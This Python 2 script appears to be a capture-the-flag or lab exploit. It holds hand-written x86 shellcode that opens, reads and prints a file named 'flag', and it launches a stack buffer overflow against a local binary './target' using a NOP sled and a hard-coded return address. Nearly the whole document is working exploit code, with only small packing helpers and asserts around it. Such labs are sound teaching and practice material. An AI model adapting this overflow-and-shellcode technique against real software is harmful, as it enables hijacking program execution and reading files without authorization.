#!/usr/bin/env python2

SHELLCODE = \
b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x36\x5e\x31\xc0\xb0\x05\x89" + \
b"\xf3\x31\xc9\xcd\x80\x89\xc6\xeb\x07\x31\xdb\x89\xd8\x40\xcd\x80" + \
b"\xb0\x03\x89\xf3\x4c\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3" + \
b"\x74\xe7\xb0\x04\xb3\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x44\xeb\xe0" + \
b"\xe8\xc5\xff\xff\xff\x66\x6c\x61\x67\x0a\x90\x90"  # length = 4 * 19


import os
import struct
import subprocess as sp

def p32(n):
    return struct.pack("<I", n)   # <  little-endian;  I  unsigned int

def p64(n):
    return struct.pack("<Q", n)   # Q  unsigned long long

def ps(n,s):
    return struct.pack(str(n)+'s', s)   # s  char[]

def up(n):
    return struct.unpack("4s", p32(n))[0] 

if __name__ == '__main__':

    # assert is used to check if binary is correct
    assert p32(0x12345678) == b'\x78\x56\x34\x12'                     # 4 bytes in m32 
    assert p64(0x12345678) == b'\x78\x56\x34\x12\x00\x00\x00\x00'     # 8 bytes in m64
    assert ps(4, 'aaaa') == b'\x61\x61\x61\x61'
    assert up(0x61626364) == 'dcba'

    env = os.environ
    nop = b"\x90\x90\x90\x90"
    BufferAddr = b"\x36\xca\xff\xff"  # Buffer Address = 0xffffca36 little endian
    EspAddr = b"\xe0\xc6\xff\xff" # esp ffffc6e0

    # overflow position = buffer length + 12 = 0x100 + 12 = 256 + 12 = 4 * 67
    args = ["./target", 67*nop + EspAddr + SHELLCODE ]   # should be argv, not shell mode, return addr cannot be zero

    p = sp.Popen(args, env=env, universal_newlines=False)

    p.wait()

